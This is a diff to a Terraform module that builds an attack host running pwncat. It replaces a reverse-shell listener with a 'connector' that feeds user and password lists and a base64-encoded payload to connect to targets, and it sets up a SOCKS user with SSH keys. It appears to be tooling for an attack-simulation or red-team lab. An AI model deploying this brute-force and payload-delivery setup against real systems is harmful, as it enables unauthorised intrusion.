@@ -3,13 +3,15 @@ locals {
     listen_ip = var.inputs["listen_ip"]
     attack_dir = "/pwncat"
     payload = <<-EOT
-    if [ -e "/tmp/pwncat_session.lock" ]  && screen -ls | grep -q "pwncat"; then
-        log "Pwncat session lock /tmp/pwncat_session.lock exists and pwncat screen session running. Skipping setup."
+    PWNCAT_LOG="/tmp/pwncat_connector.log"
+    PWNCAT_SESSION="pwncat_connector"
+    PWNCAT_SESSION_LOCK="pwncat_connector_session.lock"
+    if [ -e "/tmp/$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; then
+        log "Pwncat session lock /tmp/$PWNCAT_SESSION_LOCK exists and $PWNCAT_SESSION screen session running. Skipping setup."
     else
-        rm -f "/tmp/pwncat_session.lock"
+        rm -f "/tmp/$PWNCAT_SESSION_LOCK"
         log "Session lock doesn't exist and screen session not runing. Continuing..."
-        log "setting up reverse shell listener: ${local.listen_ip}:${local.listen_port}"
-        screen -S pwncat -X quit
+        screen -S $PWNCAT_SESSION -X quit
         screen -wipe
         log "cleaning app directory"
         rm -rf ${local.attack_dir}
@@ -36,41 +38,25 @@ locals {
             sudo -H -u socksuser /bin/bash -c "chmod 600 /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
             log "socksuser setup complete..."
         fi
+        log "checking for user and password list before starting..."
+        while ! [ -f "${var.inputs["user_list"]}" ] || ! [ -f "${var.inputs["password_list"]}" ]; do
+            log "waiting for ${var.inputs["user_list"]} and ${var.inputs["password_list"]}..."
+            sleep 30
+        done
         START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
         while true; do
-            PWNCAT_LOG="/tmp/pwncat.log"
             for i in `seq $((MAXLOG-1)) -1 1`; do mv "$PWNCAT_LOG."{$i,$((i+1))} 2>/dev/null || true; done
             mv $PWNCAT_LOG "$PWNCAT_LOG.1" 2>/dev/null || true
             log "starting background process via screen..."
-            screen -S pwncat -X quit
+            screen -S $PWNCAT_SESSION -X quit
             screen -wipe
-            nohup /bin/bash -c "screen -d -L -Logfile $PWNCAT_LOG -S pwncat -m python3.9 listener.py --port ${local.listen_port}" >/dev/null 2>&1 &
-            screen -S pwncat -X colon "logfile flush 0^M"
-            log "Checking for listener..."
-            TIMEOUT=1800
-            START_TIME=$(date +%s)
-            while true; do
-                CURRENT_TIME=$(date +%s)
-                ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
-                if grep "listener created" $PWNCAT_LOG; then
-                    log "Found listener created log in $PWNCAT_LOG - checking for port response"
-                    while ! nc -z -w 5 -vv 127.0.0.1 ${local.listen_port} > /dev/null; do
-                        log "failed check - waiting for pwncat port response";
-                        sleep 30;
-                    done;
-                    log "Sucessfully connected to 127.0.0.1:${local.listen_port}"
-                    break
-                fi
-                if [ $ELAPSED_TIME -gt $TIMEOUT ]; then
-                    log "Failed to find listener created log for pwncat - timeout after $TIMEOUT seconds"
-                    exit 1
-                fi
-            done
-            log "responder started."
+            nohup /bin/bash -c "screen -d -L -Logfile $PWNCAT_LOG -S $PWNCAT_SESSION -m python3.9 connector.py --user-list=\"${var.inputs["user_list"]}\" --password-list=\"${var.inputs["password_list"]}\" --task=\"${var.inputs["task"]}\"--payload=\"${base64encode(var.inputs["payload"])}\" >/dev/null 2>&1 &
+            screen -S $PWNCAT_SESSION -X colon "logfile flush 0^M"
+            log "connector started."
             log "starting sleep for 30 minutes - blocking new tasks while accepting connections..."
             sleep 1800
             log "sleep complete - checking for running sessions..."
-            while [ -e "/tmp/pwncat_session.lock" ]  && screen -ls | grep -q "pwncat"; do
+            while [ -e "/tmp/$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "pwncat_connector"; do
                 log "pwncat session still running - waiting before restart..."
                 sleep 600
             done
@@ -90,6 +76,7 @@ locals {
     connector        = base64encode(file(
                                 "${path.module}/resources/connector.py", 
                             ))
+
     # attacker_session       = base64encode(templatefile(
     #                             "${path.module}/resources/attacker_session.py", 
     #                             {
